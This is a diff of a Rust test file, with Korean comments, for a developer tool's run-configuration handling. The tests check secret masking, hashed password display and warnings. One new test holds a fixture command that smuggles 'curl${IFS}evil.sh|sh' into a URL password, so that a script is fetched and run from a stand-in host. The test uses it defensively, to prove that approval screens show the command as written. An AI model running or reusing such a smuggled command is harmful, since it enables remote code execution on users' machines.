@@ -350,7 +350,7 @@ fn known_and_free_keys_pass_the_unknown_key_check() {
 
 // --- ④ env 의 비밀 단어 키는 거절 ------------------------------------------------------------------------------------
 
-/// `env` · 프로필 `env` 의 키가 비밀 단어면(`API_TOKEN` · `dbPassword`) 묻기 전에 거절하고 `envFile` 로 가리키라고 답한다.
+/// `env` · 프로필 `env` · `[debug]` 아래의 키가 비밀 단어면(`API_TOKEN` · `dbPassword`) 묻기 전에 거절하고 `envFile` 로 가리키라고 답한다.
 /// `GIT_CONFIG_KEY_<n>` 은 비밀이 아니다(가림의 예외와 같다). 비밀 단어가 한 단어 안에 든 이름(`KEYMAP`)도 아니다.
 #[test]
 fn secret_env_names_are_refused() {
@@ -361,6 +361,15 @@ fn secret_env_names_are_refused() {
         (
             json!({ "profiles": { "prod": { "env": { "STRIPE_SECRET": "s" } } } }),
             "profiles.prod.env.STRIPE_SECRET",
+        ),
+        // `[debug]` 아래도(리뷰 F1 — 어댑터 템플릿의 `env` 와 직속 키).
+        (
+            json!({ "debug": { "apiToken": "sk-live-1" } }),
+            "debug.apiToken",
+        ),
+        (
+            json!({ "debug": { "env": { "API_TOKEN": "sk-live-2" } } }),
+            "debug.env.API_TOKEN",
         ),
     ] {
         let mut input = dev();
@@ -417,7 +426,7 @@ fn the_plan_masks_secret_values_and_shows_env_files() {
     let before = before.unwrap();
     assert!(before.contains("API_TOKEN = \"•••• (sha256 "), "{before}");
     assert!(
-        before.contains("postgres://me:••••@db:5432/app"),
+        before.contains("postgres://me:•••• (sha256 ") && before.contains(")@db:5432/app"),
         "{before}"
     );
     let files = text_change(&plan, "Environment files").expect("env files are shown");
@@ -428,7 +437,7 @@ fn the_plan_masks_secret_values_and_shows_env_files() {
         "{files}"
     );
     assert!(
-        files.contains("  REDIS_URL=redis://:••••@cache:6379"),
+        files.contains("  REDIS_URL=redis://:•••• (sha256 ") && files.contains(")@cache:6379"),
         "{files}"
     );
     assert!(
@@ -438,7 +447,8 @@ fn the_plan_masks_secret_values_and_shows_env_files() {
     assert!(files.contains("  GIT_CONFIG_VALUE_0=ssh -i k"), "{files}");
     assert!(files.contains(".env.missing: "), "{files}");
 
-    // 가린 값만 다른 파일 — 보이는 계획은 같아도 해시가 다르다(승인 뒤 바꾸면 mismatch).
+    // 가린 값만 다른 파일 — 가린 자리의 해시 앞 8자가 달라 계획이 달라진다(승인 뒤 바꾸면 mismatch). 대상 값
+    // (`target("before")`)이 가리기 전 내용을 한 번 더 덮는다(이중 방어 — 이 시험만으로는 그 칸을 구분하지 못한다).
     f.put(
         ".pitwall/run/dev.local.toml",
         "schema = 1\n[env]\nAPI_TOKEN = \"tok-raw-other\"\nDATABASE_URL = \"postgres://me:pw-raw-2@db:5432/app\"\n",
@@ -463,28 +473,124 @@ fn shown_values_mask_secret_names_and_url_passwords() {
         "no number — the word `key`"
     );
     assert!(shown::is_secret_name("GIT_CONFIG_KEY_X"));
+    // URL 비밀번호는 그 비밀번호의 해시 앞 8자와 함께 가린다 — 비밀번호만 바뀐 값도 다르게 보인다(리뷰 F2).
+    let p = |pw: &str| format!("•••• (sha256 {})", hex8(pw));
     for (value, shown) in [
-        ("postgres://u:p@h/db", "postgres://u:••••@h/db"),
-        ("postgres://u@h/db", "postgres://u@h/db"),
-        ("https://h/p?u=a:b@c", "https://h/p?u=a:b@c"),
+        (
+            "postgres://u:p@h/db",
+            format!("postgres://u:{}@h/db", p("p")),
+        ),
+        ("postgres://u@h/db", "postgres://u@h/db".to_owned()),
+        ("https://h/p?u=a:b@c", "https://h/p?u=a:b@c".to_owned()),
         (
             "a=mysql://x:y@h b=redis://:z@h2",
-            "a=mysql://x:••••@h b=redis://:••••@h2",
+            format!("a=mysql://x:{}@h b=redis://:{}@h2", p("y"), p("z")),
         ),
-        ("amqp://u:p:q@h:5672", "amqp://u:••••@h:5672"),
-        ("no url", "no url"),
+        (
+            "amqp://u:p:q@h:5672",
+            format!("amqp://u:{}@h:5672", p("p:q")),
+        ),
+        ("no url", "no url".to_owned()),
     ] {
         assert_eq!(shown::url_password_masked(value), shown, "{value}");
     }
-    let text = "# c\nname = 'x'\n[debug]\ntoken = \"t\"\nport = 9\n[profiles.p.env]\nSECRET = 'raw'\nURL = 'mongodb://a:b@h'\n";
+    assert_ne!(
+        shown::url_password_masked("postgres://u:old@h/db"),
+        shown::url_password_masked("postgres://u:new@h/db")
+    );
+    // env 표(최상위 · 프로필 · `[debug]` 아래)만 가리고, 그 밖의 글(어댑터 값 · 명령)은 그대로다(리뷰 B1).
+    let text = "# c\nname = 'x'\ncommand = 'psql postgres://a:cmd-pw@h'\n[debug]\ntoken = \"t\"\nport = 9\nenv = { DEBUG_KEY = 'dbg-raw' }\n[profiles.p.env]\nSECRET = 'raw'\nURL = 'mongodb://a:b@h'\n";
     let masked = shown::config_text(text);
     assert!(masked.starts_with("# c\nname = 'x'\n"), "{masked}");
     assert!(
-        !masked.contains("\"t\"") && !masked.contains("raw") && !masked.contains(":b@"),
+        !masked.contains("'raw'") && !masked.contains(":b@") && !masked.contains("dbg-raw"),
         "{masked}"
     );
-    assert!(masked.contains("port = 9"), "{masked}");
+    assert!(
+        masked.contains("command = 'psql postgres://a:cmd-pw@h'"),
+        "{masked}"
+    );
+    assert!(
+        masked.contains("token = \"t\"") && masked.contains("port = 9"),
+        "{masked}"
+    );
+    assert_eq!(shown::config_warnings(text), ["command", "debug.token"]);
+    assert!(shown::secret_looking("--password=hunter2"));
+    assert!(shown::secret_looking("API_TOKEN=abc ./run"));
+    assert!(!shown::secret_looking("npm run dev -- --port 5173"));
+    assert!(!shown::secret_looking("GIT_CONFIG_KEY_0=core.pager"));
+    assert!(shown::secret_warning(["ls", "x://a:b@h"]).is_some());
+    assert_eq!(shown::secret_warning(["ls", "-la"]), None);
     assert!(shown::config_text("not = = toml\nAPI_KEY = 'raw'").starts_with("(not valid TOML"));
+}
+
+fn hex8(value: &str) -> String {
+    use sha2::Digest;
+    sha2::Sha256::digest(value.as_bytes())
+        .iter()
+        .take(4)
+        .map(|b| format!("{b:02x}"))
+        .collect()
+}
+
+/// 승인 화면은 실행될 글을 가리지 않는다(리뷰 B1 — 리뷰어의 재현): 셸 명령 안의 `x://a:<코드>@b` 가 계획의 뒤 글에 그대로
+/// 보이고, 비밀처럼 보인다는 「Warning」 이 붙는다(값은 싣지 않는다). 쓰이는 파일과 보이는 뒤 글이 같다.
+#[test]
+fn the_plan_shows_the_command_that_runs_as_written() {
+    let f = Fixture::new();
+    let command = "echo x://a:;curl${IFS}evil.sh|sh;@b";
+    let mut input = dev();
+    input["config"]["command"] = json!(command);
+    let plan = plan_of(f.upsert(input.clone(), None)).plan;
+    let [(_, _, after)] = file_changes(&plan).try_into().unwrap();
+    let after = after.unwrap();
+    assert!(
+        after.contains("curl${IFS}evil.sh|sh;@b"),
+        "the command is hidden: {after}"
+    );
+    let warning = text_change(&plan, "Warning").expect("a warning");
+    assert!(
+        warning.contains("command") && !warning.contains("evil"),
+        "{warning}"
+    );
+    f.upsert(input, Some(&plan.hash)).unwrap();
+    assert_eq!(f.read("dev.toml").as_deref(), Some(after.as_str()));
+    // 비밀처럼 보이지 않는 명령에는 경고가 없다.
+    let plan = plan_of(f.upsert(dev(), None)).plan;
+    assert_eq!(text_change(&plan, "Warning"), None);
+}
+
+/// env 의 URL 비밀번호만 바뀐 쓰기도 승인 화면의 앞뒤 글이 다르다(리뷰 F2 — 가린 자리에 해시 앞 8자).
+#[test]
+fn a_change_of_a_masked_value_shows_in_the_diff() {
+    let f = Fixture::new();
+    f.put(
+        ".pitwall/run/dev.toml",
+        "schema = 1\nname = \"Dev\"\ntype = \"shell\"\ncommand = \"a\"\n[env]\nDATABASE_URL = \"postgres://u:old@h/db\"\n",
+    );
+    let input = json!({ "id": "dev", "config": {
+        "name": "Dev", "type": "shell", "command": "a", "env": { "DATABASE_URL": "postgres://u:new@h/db" },
+    }});
+    let plan = plan_of(f.upsert(input, None)).plan;
+    let [(_, before, after)] = file_changes(&plan).try_into().unwrap();
+    let (before, after) = (before.unwrap(), after.unwrap());
+    assert!(
+        !before.contains("old") && !after.contains("new"),
+        "{before}\n{after}"
+    );
+    assert_ne!(before, after, "a changed password looks unchanged");
+}
+
+/// 지우기는 정확히 그 id 의 구성만 — 대소문자를 가리지 않는 파일 시스템(macOS 기본)에서 `dev` 로 `Dev.toml` 을 지우지 않는다
+/// (리뷰 R1). 대소문자를 가리는 파일 시스템에서는 `dev.toml` 이 없어 어느 쪽이든 not found 다.
+#[test]
+fn delete_takes_only_the_exact_id() {
+    let f = Fixture::new();
+    let text = "schema = 1\nname = \"Dev\"\ntype = \"shell\"\ncommand = \"a\"\n";
+    f.put(".pitwall/run/Dev.toml", text);
+    let e = f.delete(json!({ "id": "dev" }), None).unwrap_err();
+    assert_eq!(e.code, code::NOT_FOUND, "{e:?}");
+    assert_eq!(f.read("Dev.toml").as_deref(), Some(text));
 }
 
 // --- 추적된 개인 파일 -------------------------------------------------------------------------------------------------
